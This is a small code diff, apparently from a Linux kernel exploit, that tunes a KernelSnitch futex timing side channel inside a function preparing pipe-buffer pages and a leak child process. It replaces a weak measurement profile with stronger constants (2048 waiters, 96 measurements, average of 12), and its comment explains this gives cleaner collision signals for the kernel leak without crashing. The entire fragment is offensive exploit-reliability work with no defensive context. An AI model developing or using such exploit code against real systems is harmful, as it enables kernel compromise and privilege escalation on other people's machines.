@@ -118,7 +118,15 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   init_ctx(&post, objs_per_slab);
 
   setup_kernelsnitch();
-  kernelsnitch_set_profile(ks, 256, 128, 1);
+  /* Match the 1st (fops) KernelSnitch pass profile exactly: 2048 waiters,
+     96 measurements, average 12. Using a weaker profile here (fewer threads /
+     average 1) produced spurious collisions (nmatch=0) because the pile-up
+     signal was too noisy. The 2048-thread pile-up no longer crashes the 2nd
+     pass because __increase() now uses a 512KiB stack (see KS_THREAD_STACK_SZ
+     in kernelsnitch.h). */
+  kernelsnitch_set_profile(ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+                           SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+                           SLIDE_KSNITCH_AVERAGE);
   pid_t leak_child = clone_leak_child();
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
